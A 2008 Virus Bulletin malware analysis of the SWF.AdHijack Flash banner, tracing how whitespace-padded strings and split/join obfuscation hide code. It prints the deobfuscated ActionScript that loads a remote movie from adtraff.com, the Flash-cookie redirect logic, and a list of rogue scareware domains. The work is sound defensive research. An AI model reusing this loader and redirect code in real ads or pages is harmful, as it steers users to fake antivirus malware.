<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Inside rogue Flash ads</title>
<meta name="description" content="As malicious web ads become increasingly common, Dennis Elser and Micha Pekrul take a close look at a Flash advertising banner belonging to the SWF.AdHijack family." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 2388;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb200801-rogue-flash-ads"></a>Inside rogue Flash ads</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2008-01-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Dennis</span> <span class="surname">Elser</span></h3><span class="orgname">Secure Computing</span>, <span class="orgdiv">Germany</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Micha</span> <span class="surname">Pekrul</span></h3><span class="orgname">Secure Computing</span>, <span class="orgdiv">Germany</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>As malicious web ads become increasingly common, Dennis Elser and Micha Pekrul take a close look at a Flash advertising banner belonging to the SWF.AdHijack family.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2008 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-4270" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-4270" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id2721206"></a></span></dt><dt><span class="sect1"><a href="#id3360345">Flash-ily dressed</a></span></dt><dt><span class="sect1"><a href="#id3988998">Unbury the code</a></span></dt><dt><span class="sect1"><a href="#id3810413">Plastic surgery</a></span></dt><dt><span class="sect1"><a href="#id4597133">Me eat Flash cookies...</a></span></dt><dt><span class="sect1"><a href="#id2759124">... and meet a Babel fish</a></span></dt><dt><span class="sect1"><a href="#id4349853">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2721206"></a></h2></div></div></div><p>As a follow-up to last month&rsquo;s article on interactive media formats [<span class="citation"><a href="#citation.1">1</a></span>], this article takes a closer look at a <em class="productname">Flash</em> advertising banner belonging to the SWF.AdHijack family &ndash; analysing some of the inner details of the SWF file format, such as particular tagged data blocks, ActionScript bytecode and its disassembly.</p><p>There is good reason for delving deeper into the SWF file format: malicious web ads are becoming increasingly common [<span class="citation"><a href="#citation.2">2</a></span>], [<span class="citation"><a href="#citation.3">3</a></span>], and SWF.AdHijack already protects its ActionScript code against decompilation. These rogue ad banners are harmless-looking &ndash; they &lsquo;only&rsquo; contain a link to a &lsquo;statsa.php&rsquo; page. That page in turn links to several other PHP web pages until the end of the chain links to malware known as Riskware.Fake.Syscontrol or Winfixer; in <em class="productname">Web 2.0</em>, it is a long and winding road to the malware executable.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3360345"></a>Flash-ily dressed</h2></div></div></div><p>The signature field of the ad&rsquo;s file header at file offset 0 indicates a ZLIB [<span class="citation"><a href="#citation.4">4</a></span>] compressed <em class="productname">Flash</em> file. The crunched data of compressed SWF files starts at file offset 8, which is in the middle of the file header. After decompression, both the header&rsquo;s Signature field and FileLength field are updated to reflect the changes respectively.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Compressed file header." src="/uploads/images/figures/2008/01/AlmeFig1.gif" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Compressed file header.</b></p></div><p>Looking at the manually uncompressed data using the freely available <em class="productname">FileInsight</em> [<span class="citation"><a href="#citation.5">5</a></span>] reveals some notable strings prefixed with a large number of whitespace characters (see <a href="#figure.2">Figure 2</a>). One of these strings is a URL linking to a PHP page, while other strings belong to a subset of ActionScript statements. The whitespace characters supposedly act as a simple, yet effective, trick to fool users of GUI-driven SWF decompilers into thinking the strings are empty (similar to those well-known email attachments &lsquo;MyNakedGirlfriend.jpg&lt;whitespaces&gt;.exe&rsquo;).</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="URL prefixed with whitespace characters." src="/uploads/images/figures/2008/01/AlmeFig2.gif" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;URL prefixed with whitespace characters.</b></p></div><p>Once uncompressed, the <em class="productname">Flash</em> ad can be inspected for interesting tagged data blocks. The tags of interest, from the perspective of an anti-virus researcher, are those that contain characteristic traits such as particular ActionScript bytecode, as well as tags used to store significant data (such as prefixed strings). </p><p>The <em class="productname">Flash</em> ad file shows the &lsquo;DefineEditText&rsquo; tag being used several times. This tag is used for creating dynamic text objects, also called edit fields. The following edit fields are found in the banner:</p><pre class="programlisting">a0 = &ldquo;&lt;whitespaces&gt;loadMovie&rdquo;
a1 = &ldquo;&lt;whitespaces&gt; http://adtraff.com/statsa.php?campaign=toolpost&rdquo;
a2 = &ldquo;&lt;whitespaces&gt;createEmptyMovieClip&rdquo;
a3 = &ldquo;&lt;whitespaces&gt;getNextHighestDepth&rdquo;
a4 = &ldquo;&lt;whitespaces&gt;_url&rdquo;
a5 = &ldquo;&lt;whitespaces&gt;substr&rdquo;
a6 = &ldquo;&lt;whitespaces&gt;0&rdquo;
a7 = &ldquo;&lt;whitespaces&gt;7&rdquo;
a8 = &ldquo;&lt;whitespaces&gt;http://&rdquo;
a9 = &ldquo;&lt;whitespaces&gt;tz&rdquo;
a10= &ldquo;&lt;whitespaces&gt;getTimezoneOffset&rdquo;
a11= &ldquo;&lt;whitespaces&gt;60&rdquo;</pre><p>The edit fields are accessed by their variable names &ndash; which, in this case, aren&rsquo;t meaningful (in terms of readability) but only a simple &lsquo;a&rsquo; character followed by a continuous number starting at zero.</p><p>Any references to these edit fields are of interest, since the &lsquo;unwanted&rsquo; URL, as well as some suspicious-looking ActionScript keywords, are processed by the code. In order to find any relevant references, the whole <em class="productname">Flash</em> movie has to be searched for tags containing ActionScript code. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3988998"></a>Unbury the code</h2></div></div></div><p>The first valuable hit is &lsquo;DefineSprite&rsquo;, which is one of the tags which, by convention, may contain a series of further tags [<span class="citation"><a href="#citation.6">6</a></span>]. In the case of SWF.AdHijack, a &lsquo;DoAction&rsquo; tag follows. The &lsquo;DoAction&rsquo; tag contains a stream of actions that forms the bytecode in the binary. Here, the first instruction is &lsquo;ActionConstantPool&rsquo;, a definition for a <span class="emphasis"><em>constant pool</em></span> (CP) that is accessible by ActionScript code using indices. Internally, the constants are saved as zero-terminated strings; the supported encodings are either ASCII- or UTF-8. </p><pre class="programlisting">DefineSprite
  DoAction
     constantpool
     (cp)0:   &ldquo;*&rdquo;
     (cp)1:   &ldquo;System&rdquo;
     (cp)2:   &ldquo;security&rdquo;
     (cp)3:   &ldquo;allowDomain&rdquo;
     (cp)4:   &ldquo;this&rdquo;
     (cp)5:   &ldquo;&rdquo;
     (cp)6:   &ldquo; &ldquo;
     &hellip;
     (cp)14:  &ldquo;_root&rdquo;
     (cp)15:  &ldquo;a4&rdquo;
     (cp)16:  &ldquo;a5&rdquo;
     (cp)17:  &ldquo;a8&rdquo;
     (cp)18:  &ldquo;a1&rdquo;
     (cp)19:  &ldquo;&amp;u=&rdquo;
     (cp)20:  &ldquo;Date&rdquo;
     (cp)21:  &ldquo;getTime&rdquo;
     (cp)22:  &ldquo;a0&rdquo;</pre><p>Some of the values of the constants shown above have previously been used as variable names for the edit fields (&lsquo;a0&rsquo; &ndash; &lsquo;a11&rsquo;). Indices into the CP are used by instructions to access the content, as indicated by the cp acronym in the disassembly below:</p><pre class="programlisting">push (cp)0 (i)1 (cp)1
getvariable
push (cp)2
getmember
push (cp)3
callmethod
pop
&hellip;</pre><p>If the CP index references are substituted with their values, the push instructions become more readable and the meaning of the code becomes more obvious:</p><pre class="programlisting">push &ldquo;*&rdquo;, 1, &ldquo;System&rdquo;
getvariable
push &ldquo;security&rdquo;
getmember
push &ldquo;allowDomain&rdquo;
callmethod
pop
&hellip;</pre><p>The first push instruction puts three values onto the stack at once. Independently of their types, they are stored as strings on the stack. The stack pointer is updated to point always at the latest value pushed onto the stack.</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="Stack layout after first push instruction." src="/uploads/images/figures/2008/01/AlmeFig3.gif" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;Stack layout after first push instruction.</b></p></div><p>The &lsquo;System&rsquo; string is exchanged with its value (&lsquo;System object&rsquo;) by &lsquo;getvariable&rsquo;, so the operation is, in fact, a dereference operating directly on the stack. The call to &lsquo;getmember&rsquo; then replaces the &lsquo;System object&rsquo; with a &lsquo;System.security object&rsquo; (see <a href="#figure.4">Figure 4</a>).</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Stack layout after second and third push instruction, respectively." src="/uploads/images/figures/2008/01/AlmeFig4.gif" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Stack layout after second and third push instruction, respectively.</b></p></div><p>The subsequent &lsquo;callmethod&rsquo; instruction takes a mutable number of arguments and pops them off the stack in the following order:</p><div class="itemizedlist"><ul type="disc"><li><p>name of method</p></li><li><p>ScriptObject</p></li><li><p>number of arguments of method to call</p></li><li><p>arguments</p></li></ul></div><p>With this information, the original high-level representation of the code can be restored (see <a href="#figure.5">Figure 5</a>). </p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="High-level code reconstruction." src="/uploads/images/figures/2008/01/AlmeFig5.gif" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;High-level code reconstruction.</b></p></div><p>The result is a single line of code which grants <em class="productname">Flash</em> movies hosted on an arbitrary domain access to its caller, known as cross-domain scripting:</p><pre class="programlisting">System.security.allowDomain(&lsquo;*&rsquo;);</pre></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3810413"></a>Plastic surgery</h2></div></div></div><p>Applying this technique to the whole disassembly found in the currently processed &lsquo;DoAction&rsquo; tag results in the following, admittedly unreadable and obfuscated, code, consisting of lots of &lsquo;split()&rsquo; and &lsquo;join()&rsquo; statements:</p><pre class="programlisting">System.security.allowDomain(&lsquo;*&rsquo;);

this[(a2.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;)](&lsquo;m1&rsquo;, this[(a3.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;)]());

_root[(a4.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;)][(a5.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;)]((a6.split(&lsquo;
&lsquo;)).join(&lsquo;&rsquo;), (a7.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;)) == (a8.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;) &amp;&amp;
this.m1[(a0.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;)]((a1.split(&lsquo; &lsquo;)).join(&lsquo;&rsquo;) + &lsquo;&amp;u=&rsquo; + (new
Date()).getTime());

stop();</pre><p>The &lsquo;split()&rsquo; and &lsquo;join()&rsquo; statements not only obfuscate the code, but are also used to remove whitespace characters from the edit field objects seen before. The normalized code shows that the adtraff.com domain is being navigated to using a call to &lsquo;loadMovie()&rsquo;:</p><pre class="programlisting">System.security.allowDomain(&lsquo;*&rsquo;);
this.createEmptyMovieClip(&lsquo;m1&rsquo;, this.getNextHighestDepth());

_root._url.substr](0, 7) == (&lsquo;http://&rsquo; &amp;&amp;
this.m1.loadMovie(&lsquo;http://adtraff.com/statsa.php?campaign=toolpost&rsquo; +
&lsquo;&amp;u=&rsquo; + (new Date()).getTime());
stop();</pre><p>&lsquo;LoadMovie()&rsquo; is called with the URL of a PHP page as an argument. However, the opening of any files other than SWF, JPEG, GIF and PNG is unsupported by the &lsquo;loadMovie()&rsquo; method. As expected, a more thorough look reveals the supposed PHP page to be yet another <em class="productname">Flash</em> movie with further code embedded. That code, depending on a cookie&rsquo;s data, is responsible either for the user seeing an ad banner or for malicious software trying to infect his machine. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4597133"></a>Me eat Flash cookies...</h2></div></div></div><p>The SWF movie behind statsa.php, hosted on adtraff.com, is requested with the URL parameters &lsquo;campaign&rsquo; and &lsquo;u&rsquo; set to specific content which is parsed by the following piece of ActionScript code:</p><pre class="programlisting">function cookie() {
      var _local4 = new Date ();
      ct = _local4.getTime();
      var _local1 = _url.split(&ldquo;campaign=&rdquo;);
      _local1 = _local1[1].split(&ldquo;&amp;u&rdquo;);
      at.text = _local1[0];
      var _local2 = SharedObject.getLocal
      (_local1[0], &ldquo;/&rdquo;);
      if (_local2.data.expires == null) {
            _local2.data.expires = ct;
      }
      var _local3 = false;
      if (ct &lt; _local2.data.expires) {
            _local3 = true;
      }
      _local2.flush();
      return (_local3);
}

 if (!cookie()) {
      _root[a.split(&ldquo; &ldquo;).join(&ldquo;&rdquo;)]
 (_url.split(&ldquo;statsa.php&rdquo;).join(&ldquo;statsg.php&rdquo;));
 }</pre><p>The code makes use of <span class="emphasis"><em>Local Shared Objects</em></span> (LSO) &ndash; better known as browser-independent Flash cookies, which can store up to 100 KB of data without the user being prompted. </p><p>The &lsquo;campaign&rsquo; parameter&rsquo;s content is used as the cookie&rsquo;s name on disk followed by a &lsquo;.sol&rsquo; file extension. In the case of SWF.AdHijack, the name is &lsquo;toolpost.sol.&rsquo; In addition, the current time (&lsquo;ct&rsquo;) is compared to the time stored within the cookie &ndash; if it exists. If there is no cookie named &lsquo;toolpost.sol&rsquo;, or its expiry date has passed, the user is redirected to another script named &lsquo;statsg.php&rsquo;. Otherwise the cookie&rsquo;s expiry date is updated with the current time and is eventually written to disk using the &lsquo;SharedObject.flush()&rsquo; method.</p><p>The ActionScript code found in the &lsquo;statsg.php&rsquo; movie file tries to keep the number of redirects to a minimum, based on the time found in the LSO. This makes it hard to reproduce the infection process, but once the trigger is known, it can easily be circumvented by deleting the cookie. LSOs on <em class="productname">Windows</em> machines are located under &lsquo;%AppData%\ Macromedia\Flash Player\#SharedObjects&rsquo; or can be managed via the Adobe Flash Player Settings Manager [<span class="citation"><a href="#citation.7">7</a></span>]. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2759124"></a>... and meet a Babel fish</h2></div></div></div><p>After several more redirects from one site to another, server-side code decides to where the user is finally being redirected, depending on the browser&rsquo;s default regional settings (as per &lsquo;Accept-Language&rsquo; HTTP header). At the time of this writing, the following set of rogue domains are the redirection destinations depending on the user&#39;s language settings. The table lists all ISO 639-1 compliant short codes for language names currently supported by the malware.</p><div class="table"><a class="chapter" id="id3073568"></a><table border="1" summary=""><colgroup><col /><col /><col /></colgroup><thead><tr><th align="center">&nbsp;</th><th align="center">&nbsp;</th><th align="center">&nbsp;</th></tr></thead><tbody><tr><td>da</td><td>Danish</td><td>fiksdinpc.com</td></tr><tr><td>de</td><td>German</td><td>diskretter.com</td></tr><tr><td>en</td><td>English</td><td>malware-scan.com</td></tr><tr><td>es</td><td>Spanish</td><td>ahorrememoria.com</td></tr><tr><td>fr</td><td>French</td><td>erreurchasseur.com</td></tr><tr><td>it</td><td>Italian</td><td>toolsicuro.com</td></tr><tr><td>ja</td><td>Japanese</td><td>hadodoraibugado.com</td></tr><tr><td>nl</td><td>Dutch</td><td>schijfbewaker.com</td></tr><tr><td>no</td><td>Norwegian</td><td>minnesparere.com</td></tr><tr><td>sv</td><td>Swedish</td><td>tryggpcverktyg.com</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;</b></p></div><p>Any languages not listed above will be redirected to the harddriveguard.com domain by default.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Process of user being hijacked." src="/uploads/images/figures/2008/01/AlmeFig6.gif" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Process of user being hijacked.</b></p></div><p>The content of these rogue domains is customized to fit the language settings of the user&rsquo;s web browser.</p><p>Efforts are made to convince users to download fake virus removal software by pretending their systems are infected. Of course, the supposed removal software is the real threat, and the support for multiple languages significantly extends the malware&rsquo;s global reach.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4349853"></a>Conclusion</h2></div></div></div><p>With the emerging use of active content within rich media files, digital marketing companies should take greater care of the content they deliver through their ad networks. With the capabilities of evolving scripting languages and cross-site scripting, there is good reason to look at ads more carefully. This article has shown the steps involved in the analysis of <em class="productname">Flash</em> ad banners, including decompiling and understanding obfuscated ActionScript code.</p><p>Tools featuring even more complicated obfuscation layers and self-modifying code may be added to the attackers&rsquo; arsenal in the future. And as mutable, external factors come into play &ndash; such as cookies, time, preferred languages or ActionScript code &ndash; the banner&rsquo;s behaviour may change at any time. Banners, videos and other multimedia documents do contain active content nowadays, and one reasonable way to help protect end-users against the misuse of these formats is by inspecting any embedded code.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4114193"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Blow up your video. Virus Bulletin, December 2007, pp.13&ndash;15. <span class="bibliosource"><a href="/virusbulletin/2007/12/blow-your-video
" target="_top">http://www.virusbtn.com/virusbulletin/archive/2007/12/vb200712-blow-up-video</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Yahoo feeds Trojan-laced ads to MySpace and PhotoBucket users, <span class="bibliosource"><a href="https://www.theregister.co.uk/2007/09/11/yahoo_serves_12million_malware_ads/" target="_blank">http://www.theregister.co.uk/2007/09/11/yahoo_serves_12million_malware_ads/</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] DoubleClick serves up vast malware blitz, <span class="bibliosource"><a href="http://www.eweek.com/article2/0,1895,2215635,00.asp" target="_blank">http://www.eweek.com/article2/0,1895,2215635,00.asp</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] RFC 1950 &ndash; ZLIB Compressed Data Format Specification version 3.3, <span class="bibliosource"><a href="http://www.faqs.org/rfcs/rfc1950.html" target="_blank">http://www.faqs.org/rfcs/rfc1950.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] Secure Computing FileInsight, <span class="bibliosource"><a href="http://www.webwasher.de/download/fileinsight.msi" target="_blank">http://www.webwasher.de/download/fileinsight.msi</a></span>.</p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] Macromedia Flash File Format Specification Version 7, <span class="bibliosource"><a href="https://www.adobe.com/licensing/developer/" target="_blank">http://www.adobe.com/licensing/developer/</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] Adobe Flash Player Settings Manager, <span class="bibliosource"><a href="https://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager06.html" target="_blank">http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager06.html</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Inside rogue Flash ads&url=https://www.virusbulletin.com/virusbulletin/2008/01/inside-rogue-flash-ads"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2008/01/inside-rogue-flash-ads'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2008/01/inside-rogue-flash-ads&title=Inside rogue Flash ads"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2008/01/inside-rogue-flash-ads&t=Inside rogue Flash ads"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2008/01/inside-rogue-flash-ads"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
